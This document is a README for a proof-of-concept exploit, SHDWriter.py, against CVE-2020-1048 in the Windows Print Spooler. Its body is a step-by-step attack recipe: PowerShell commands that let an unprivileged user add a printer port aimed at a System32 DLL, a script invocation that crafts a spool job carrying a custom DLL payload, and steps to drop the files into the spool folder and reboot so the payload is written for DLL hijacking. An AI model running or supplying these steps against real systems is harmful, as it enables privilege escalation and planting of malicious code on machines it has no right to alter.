# SHDWriter (CVE-2020-1048 Exploit PoC)
The folder contains the ```SHDWriter.py``` file which creates a crafted SHD print job file, which allows a user to "print" (write) any data he would like to any path (Arbitrary File Write) using the CVE-2020-1048 of the Print Spooler service.

## Exploit Instructions
we will use the following for demonstration purposes: 
- PowerShell, but it can be done using WMI and/or WinAPI as well.
- Write data to c:\windows\system32\wbem\wbemcomn.dll (DLL Hijacking), but of course any other DLL or a file can be used.
- SBPrinter as the printer name, but any name can be used.
------

1. Add a virtual printer port, printer driver and virtual printer (by using an unprivileged user:)
   ```
   Add-PrinterPort "c:\windows\system32\wbem\wbemcomn.dll";
   Add-PrinterDriver "SBPrinter";
   Add-Printer -Name "SBPrinter" -DriverName "MS Publisher Color Printer" -PortName "c:\windows\system32\wbem\wbemcomn.dll";
   ```

2. Run the PoC script which generates the crafted SHD file (It can be done on your computer, outside of the VM which you'll exploit the vuln on). 
You can change the parameters according to your environment:
    ```
    python SHDWriter.py --arch 64 --filePath custom_payload.dll --driverName "MS Publisher Color Printer" --printerName SBPrinter --writePath "c:\\windows\\system32\\wbem\\wbemcomn.dll" --winMajorVer 10
    ```

3. Rename the payload file to be copied to ```00012.SPL``` 
4. Copy the crafted SHD and SPL files from the PoC folder (```00012.SHD```) to the  ```c:\windows\system32\spool\PRINTERS\``` folder.
5. Restart the VM.
6. The Print Spooler service will process the SHD file, and will write the payload you provided to the path you provided.